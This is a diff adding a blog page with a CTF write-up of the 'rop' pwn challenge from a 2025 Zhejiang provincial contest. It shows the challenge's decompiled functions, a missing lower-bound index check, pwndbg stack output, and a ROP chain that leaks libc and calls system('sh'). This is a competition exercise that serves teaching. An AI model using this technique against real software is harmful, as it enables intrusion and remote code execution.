@@ -1,0 +1,1128 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="yfor">
+    
+    <!-- Completely eliminate flash of wrong theme -->
+    <script>
+        (function() {
+            const THEME_KEY = "REDEFINE-THEME-STATUS";
+            const DARK = "dark", LIGHT = "light";
+            
+            // Get preferred theme
+            function getTheme() {
+                try {
+                    const saved = localStorage.getItem(THEME_KEY);
+                    if (saved) {
+                        const { isDark } = JSON.parse(saved);
+                        return isDark ? DARK : LIGHT;
+                    }
+                } catch (e) {}
+                
+                return matchMedia("(prefers-color-scheme: dark)").matches ? DARK : LIGHT;
+            }
+            
+            // Apply theme to document
+            function applyTheme(theme) {
+                const isDark = theme === DARK;
+                const root = document.documentElement;
+                
+                // Set data attribute for CSS variables
+                root.setAttribute("data-theme", theme);
+                
+                // Set classes for compatibility
+                root.classList.add(theme);
+                root.classList.remove(isDark ? LIGHT : DARK);
+                root.style.colorScheme = theme;
+            }
+            
+            // Initial application
+            const theme = getTheme();
+            applyTheme(theme);
+            
+            // Listen for system preference changes
+            matchMedia("(prefers-color-scheme: dark)").addEventListener("change", ({ matches }) => {
+                // Only update if using system preference (no localStorage entry)
+                if (!localStorage.getItem(THEME_KEY)) {
+                    applyTheme(matches ? DARK : LIGHT);
+                }
+            });
+            
+            // Set body classes once DOM is ready
+            if (document.readyState !== "loading") {
+                document.body.classList.add(theme + "-mode");
+            } else {
+                document.addEventListener("DOMContentLoaded", () => {
+                    document.body.classList.add(theme + "-mode");
+                    document.body.classList.remove((theme === DARK ? LIGHT : DARK) + "-mode");
+                });
+            }
+        })();
+    </script>
+    
+    <!-- Critical CSS to prevent flash -->
+    <style>
+        :root[data-theme="dark"] {
+            --background-color: #202124;
+            --background-color-transparent: rgba(32, 33, 36, 0.6);
+            --second-background-color: #2d2e32;
+            --third-background-color: #34353a;
+            --third-background-color-transparent: rgba(32, 33, 36, 0.6);
+            --primary-color: #0066CC;
+            --first-text-color: #ffffff;
+            --second-text-color: #eeeeee;
+            --third-text-color: #bebec6;
+            --fourth-text-color: #999999;
+            --default-text-color: #bebec6;
+            --invert-text-color: #373D3F;
+            --border-color: rgba(255, 255, 255, 0.08);
+            --selection-color: #0066CC;
+            --shadow-color-1: rgba(255, 255, 255, 0.08);
+            --shadow-color-2: rgba(255, 255, 255, 0.05);
+        }
+        
+        :root[data-theme="light"] {
+            --background-color: #fff;
+            --background-color-transparent: rgba(255, 255, 255, 0.6);
+            --second-background-color: #f8f8f8;
+            --third-background-color: #f2f2f2;
+            --third-background-color-transparent: rgba(241, 241, 241, 0.6);
+            --primary-color: #0066CC;
+            --first-text-color: #16171a;
+            --second-text-color: #2f3037;
+            --third-text-color: #5e5e5e;
+            --fourth-text-color: #eeeeee;
+            --default-text-color: #373D3F;
+            --invert-text-color: #bebec6;
+            --border-color: rgba(0, 0, 0, 0.08);
+            --selection-color: #0066CC;
+            --shadow-color-1: rgba(0, 0, 0, 0.08);
+            --shadow-color-2: rgba(0, 0, 0, 0.05);
+        }
+        
+        body {
+            background-color: var(--background-color);
+            color: var(--default-text-color);
+        }
+        
+        /* Apply body classes as soon as DOM is ready */
+        :root[data-theme="dark"] body {
+            background-color: var(--background-color);
+            color: var(--default-text-color);
+        }
+    </style>
+    
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://example.com/2025/11/10/2025浙江省省赛-初赛-wp/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+    
+    
+        
+        <meta name="description" content="welcome">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2025浙江省省赛-初赛-wp">
+<meta property="og:url" content="http://example.com/2025/11/10/2025%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B-%E5%88%9D%E8%B5%9B-wp/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="welcome">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/images/redefine-og.webp">
+<meta property="article:published_time" content="2025-11-09T16:06:35.263Z">
+<meta property="article:modified_time" content="2025-11-09T16:06:20.075Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="wp">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/redefine-og.webp">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/yfor.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/yfor.png">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/images/yfor.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            2025浙江省省赛-初赛-wp | yfor的小pwn窝
+        
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/css/build/tailwind.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">
+
+    
+<link rel="stylesheet" href="/fonts/Geist/geist.css">
+
+    <!--- Font Part-->
+    
+    
+    
+        <link href="" rel="stylesheet">
+    
+    
+        <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+SC:wght@400;500;700&display=swap" rel="stylesheet">
+    
+    
+        <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
+    
+    
+        
+<script src="/js/build/libs/anime.min.js"></script>
+
+    
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"example.com","root":"/","language":"en","path":"search.json"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":false,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":true,"family":"Noto Sans SC, sans-serif","url":""},"english":{"enable":true,"family":"'Open Sans', -apple-system, BlinkMacSystemFont, sans-serif","url":"https://fonts.googleapis.com/css2?family=Noto+Sans+SC:wght@400;500;700&display=swap"},"title":{"enable":true,"family":"'Open Sans', PingFang SC, -apple-system, BlinkMacSystemFont, sans-serif","url":"https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;500;600;700&display=swap"}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":true,"custom_message":"yfor's blog✧*｡ (ˊᗜˋ*) ✧*"},"side_tools":{"gear_rotation":true,"auto_expand":false},"open_graph":{"enable":true,"image":"/images/redefine-og.webp","description":"welcome"},"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/background.jpg# light mode","dark":"/images/background.jpg"},"title":"yfor's blog","subtitle":{"text":["性格是我的不治之症"],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":60,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"style":"center","links":{"github":"https://github.com/yfor-yfor/","instagram":null,"zhihu":null,"twitter":null,"email":"2289014121@qq.com"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"11.4.1"}},"version":"2.8.5","navbar":{"auto_hide":false,"color":{"left":"#000000","right":"#ffffff","transparency":80},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-file-text"},"friends":{"path":"/links","icon":"fa-regular fa-link"}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2022/8/17 11:45:14"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 8.1.0"></head>
+
+
+
+<body>
+	<div class="progress-bar-container">
+	
+
+	
+	<span class="pjax-progress-bar"></span>
+	<!--        <span class="swup-progress-icon">-->
+	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+	<!--        </span>-->
+	
+</div>
+
+<style>
+    :root {
+        --preloader-background-color: #fff;
+        --preloader-text-color: #000;
+    }
+
+    @media (prefers-color-scheme: dark) {
+        :root {
+            --preloader-background-color: #202124;
+            --preloader-text-color: #fff;
+        }
+    }
+
+    @media (prefers-color-scheme: light) {
+        :root {
+            --preloader-background-color: #fff;
+            --preloader-text-color: #000;
+        }
+    }
+
+    @media (max-width: 600px) {
+        .ml13 {
+            font-size: 2.6rem !important; /* Adjust this value as needed */
+        }
+    }
+
+    .preloader {
+        display: flex;
+        flex-direction: column;
+        gap: 1rem; /* Tailwind 'gap-4' is 1rem */
+        align-items: center;
+        justify-content: center;
+        position: fixed;
+        padding: 12px;
+        top: 0;
+        right: 0;
+        bottom: 0;
+        left: 0;
+        width: 100vw;
+        height: 100vh; /* 'h-screen' is 100% of the viewport height */
+        background-color: var(--preloader-background-color);
+        z-index: 1100; /* 'z-[1100]' sets the z-index */
+        transition: opacity 0.2s ease-in-out;
+    }
+
+    .ml13 {
+        font-size: 3.2rem;
+        /* text-transform: uppercase; */
+        color: var(--preloader-text-color);
+        letter-spacing: -1px;
+        font-weight: 500;
+        font-family: 'Chillax-Variable', sans-serif;
+        text-align: center;
+    }
+
+    .ml13 .word {
+        display: inline-flex;
+        flex-wrap: wrap;
+        white-space: nowrap;
+    }
+
+    .ml13 .letter {
+        display: inline-block;
+        line-height: 1em;
+    }
+</style>
+
+<div class="preloader">
+    <h2 class="ml13">
+        yfor&#39;s blog✧*｡ (ˊᗜˋ*) ✧*
+    </h2>
+    <script>
+        var textWrapper = document.querySelector('.ml13');
+        // Split text into words
+        var words = textWrapper.textContent.trim().split(' ');
+
+        // Clear the existing content
+        textWrapper.innerHTML = '';
+
+        // Wrap each word and its letters in spans
+        words.forEach(function(word) {
+            var wordSpan = document.createElement('span');
+            wordSpan.classList.add('word');
+            wordSpan.innerHTML = word.replace(/\S/g, "<span class='letter'>$&</span>");
+            textWrapper.appendChild(wordSpan);
+            textWrapper.appendChild(document.createTextNode(' ')); // Add space between words
+        });
+
+        var animation = anime.timeline({ loop: true })
+            .add({
+                targets: '.ml13 .letter',
+                translateY: [20, 0],
+                translateZ: 0,
+                opacity: [0, 1],
+                filter: ['blur(5px)', 'blur(0px)'],
+                easing: "easeOutExpo",
+                duration: 1200,
+                delay: (el, i) => 300 + 20 * i,
+            })
+            .add({
+                targets: '.ml13 .letter',
+                translateY: [0, -20],
+                opacity: [1, 0],
+                filter: ['blur(0px)', 'blur(5px)'],
+                easing: "easeInExpo",
+                duration: 1000,
+                delay: (el, i) => 15 * i,
+                complete: function() {
+                    hidePreloader();
+                }
+            }, '-=700');
+
+
+        let themeStatus = JSON.parse(localStorage.getItem('REDEFINE-THEME-STATUS'))?.isDark;
+
+        // If the theme status is not found in local storage, check the preferred color scheme
+        if (themeStatus === undefined || themeStatus === null) {
+            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+                themeStatus = 'dark';
+            } else {
+                themeStatus = 'light';
+            }
+        }
+
+        // Now you can use the themeStatus variable in your code
+        if (themeStatus) {
+            document.documentElement.style.setProperty('--preloader-background-color', '#202124');
+            document.documentElement.style.setProperty('--preloader-text-color', '#fff');
+        } else {
+            document.documentElement.style.setProperty('--preloader-background-color', '#fff');
+            document.documentElement.style.setProperty('--preloader-text-color', '#000');
+        }
+
+        window.addEventListener('load', function () {
+            setTimeout(hidePreloader, 5000); // Call hidePreloader after 5000 milliseconds if not already called by animation
+        });
+
+        function hidePreloader() {
+            var preloader = document.querySelector('.preloader');
+            preloader.style.opacity = '0';
+            setTimeout(function () {
+                preloader.style.display = 'none';
+            }, 200);
+        }
+    </script>
+</div>
+
+<main class="page-container" id="swup">
+
+	
+
+	<div class="main-content-container flex flex-col justify-between min-h-dvh">
+		<div class="main-content-header">
+			<header class="navbar-container px-6 md:px-12">
+    <div class="navbar-content transition-navbar ">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                yfor的小pwn窝
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    HOME
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/archives"
+                                        >
+                                    <i class="fa-regular fa-file-text fa-fw"></i>
+                                    ARCHIVES
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/links"
+                                        >
+                                    <i class="fa-regular fa-link fa-fw"></i>
+                                    FRIENDS
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                        <li class="navbar-item search search-popup-trigger">
+                            <i class="fa-solid fa-magnifying-glass"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
+                    </div>
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                HOME
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/archives"
+                        >
+                            <span>
+                                ARCHIVES
+                            </span>
+                            
+                                <i class="fa-regular fa-file-text fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/links"
+                        >
+                            <span>
+                                FRIENDS
+                            </span>
+                            
+                                <i class="fa-regular fa-link fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+
+            
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">1</div>
+        <div class="label text-third-text-color text-sm">Tags</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">0</div>
+        <div class="label text-third-text-color text-sm">Categories</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">1</div>
+        <div class="label text-third-text-color text-sm">Posts</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+		</div>
+
+		<div class="main-content-body transition-fade-up">
+			
+
+			<div class="main-content">
+				<div class="post-page-container flex relative justify-between box-border w-full h-full">
+	<div class="article-content-container">
+
+		<div class="article-title relative w-full">
+			
+			<div class="w-full flex items-center pt-6 justify-start">
+				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">2025浙江省省赛-初赛-wp</h1>
+			</div>
+			
+		</div>
+
+		
+		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+				<img src="https://nimg.ws.126.net/?url=http%3A%2F%2Fdingyue.ws.126.net%2F2024%2F0602%2Fba5b7469j00seg2na004zd000u000u0m.jpg&thumbnail=660x2147483647&quality=80&type=jpg">
+			</div>
+			<div class="info flex flex-col justify-between">
+				<div class="author flex items-center">
+					<span class="name text-default-text-color text-lg font-semibold">yfor</span>
+					
+				</div>
+				<div class="meta-info">
+					<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2025-11-10 00:06:35</span>
+        <span class="mobile">2025-11-10 00:06:35</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2025-11-10 00:06:20</span>
+            <span class="mobile">2025-11-10 00:06:20</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/wp/">wp</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+				</div>
+			</div>
+		</div>
+		
+
+		
+
+
+		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+			<h1 id="题目链接"><a href="#题目链接" class="headerlink" title="题目链接"></a>题目链接</h1><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//github.com/yfor-yfor/-/tree/main/2025%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B-%E5%88%9D%E8%B5%9B</span></span><br></pre></td></tr></table></figure></div>
+
+<h1 id="rop"><a href="#rop" class="headerlink" title="rop"></a>rop</h1><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>有input和output两个函数，函数的参数是s</p>
+<p>对s构造如下结构体后方便分析,由一个数组和一个变量index组成</p>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">arr</span>&#123;</span></span><br><span class="line">__int64 arr[<span class="number">9</span>];</span><br><span class="line"> __int64 index;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p><strong>input</strong></p>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">input</span><span class="params">(arr *s)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 index; <span class="comment">// [rsp+18h] [rbp-38h]</span></span><br><span class="line">  <span class="type">char</span> sa[<span class="number">40</span>]; <span class="comment">// [rsp+20h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 canary; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  canary = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  index = s-&gt;index;</span><br><span class="line">  <span class="keyword">if</span> ( index &lt;= <span class="number">9</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;input your number:&quot;</span>);</span><br><span class="line">    fgets(sa, <span class="number">24</span>, <span class="built_in">stdin</span>);</span><br><span class="line">    s-&gt;arr[index] = atoll(sa);</span><br><span class="line">    ++s-&gt;index;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;input error&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28u</span>) ^ canary;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>漏洞点在于，当我们input8次后，s-&gt;index变成9，此时输入的number会写到s-&gt;index里，这时候我们就可以控制下次读入的位置了</p>
+<p>而if的检查只检查上限，因此可以令s-&gt;index为一个负数值来修改负数下标处的内容</p>
+<p>而s结构体的地址在main函数的栈帧上，因此我们有了在栈上任意写的能力</p>
+<p><strong>output</strong></p>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">output</span><span class="params">(arr *s)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 index; <span class="comment">// [rsp+10h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 canary; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  canary = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;index:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%lld&quot;</span>, &amp;index);</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="keyword">if</span> ( index &lt;= <span class="number">9</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;your number:&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>, s-&gt;arr[index]);</span><br><span class="line">    s-&gt;arr[index] = <span class="number">0LL</span>;</span><br><span class="line">    --s-&gt;index;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;output error&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28u</span>) ^ canary;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>output也同样不检查index的下限，根据之前分析的可知，s在栈上，只要我们输入一个&lt;&#x3D;9的值，就可以泄露低地址处栈上的值，比如libc</p>
+<h2 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h2><p>实际的攻击更加简单，都不用覆写index</p>
+<p>gdb调试input的内容可以发现</p>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; tele <span class="number">0x7fffffffde00</span>  <span class="number">15</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│<span class="number">-070</span>     <span class="number">0x7fffffffde00</span> —▸ <span class="number">0x401190</span> ◂— endbr64 </span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│ rsp     <span class="number">0x7fffffffde08</span> —▸ <span class="number">0x401523</span> ◂— jmp <span class="number">0x4014cc</span> <span class="comment">//返回地址</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│ rax rdi <span class="number">0x7fffffffde10</span> ◂— <span class="number">0</span>                        <span class="comment">//s-&gt;arr[0]</span></span><br><span class="line">... ↓            <span class="number">9</span> skipped                                  <span class="comment">//s-&gt;arr[1~8]&amp;s-&gt;index </span></span><br><span class="line"><span class="number">0</span>c:<span class="number">0060</span>│<span class="number">-010</span>     <span class="number">0x7fffffffde60</span> —▸ <span class="number">0x7fffffffdf60</span> ◂— <span class="number">1</span></span><br><span class="line"><span class="number">0</span>d:<span class="number">0068</span>│<span class="number">-008</span>     <span class="number">0x7fffffffde68</span> ◂— <span class="number">0xab2679a5e8c33c00</span></span><br><span class="line"><span class="number">0</span>e:<span class="number">0070</span>│ rbp     <span class="number">0x7fffffffde70</span> ◂— <span class="number">0</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; x $rdi</span><br><span class="line"><span class="number">0x7fffffffde10</span>:	<span class="number">0x00000000</span></span><br></pre></td></tr></table></figure></div>
+
+<p>也就是我们可以直接在返回地址附近写入攻击内容</p>
+<p>先通过output泄露libc</p>
+<p>再开始input的布置，由于output会让index-1，此时修改的位置就是返回地址，所以把返回地址的值复原回去</p>
+<p>之后我们就可以布置返回地址后方的攻击链了</p>
+<p>也就是从arr[0]开始，理论上来说应该是</p>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">arr[<span class="number">0</span>]:sh</span><br><span class="line">arr[<span class="number">1</span>]:ret</span><br><span class="line">arr[<span class="number">2</span>]:system</span><br></pre></td></tr></table></figure></div>
+
+<p>此时再通过多次output，令index&#x3D;-1</p>
+<p>写入<code>arr[-1]:pop_rdi_ret</code> 即劫持返回地址来触发完整攻击链</p>
+<p>不过后续发现，output会把arr[0]清零，但是也很好处理，如下布置即可：</p>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">arr[<span class="number">-1</span>]:pop_rdi_ret</span><br><span class="line">arr[<span class="number">0</span>]:<span class="number">0</span></span><br><span class="line">arr[<span class="number">1</span>]:pop_rdi</span><br><span class="line">arr[<span class="number">2</span>]:sh</span><br><span class="line">arr[<span class="number">3</span>]:ret</span><br><span class="line">arr[<span class="number">4</span>]:system</span><br></pre></td></tr></table></figure></div>
+
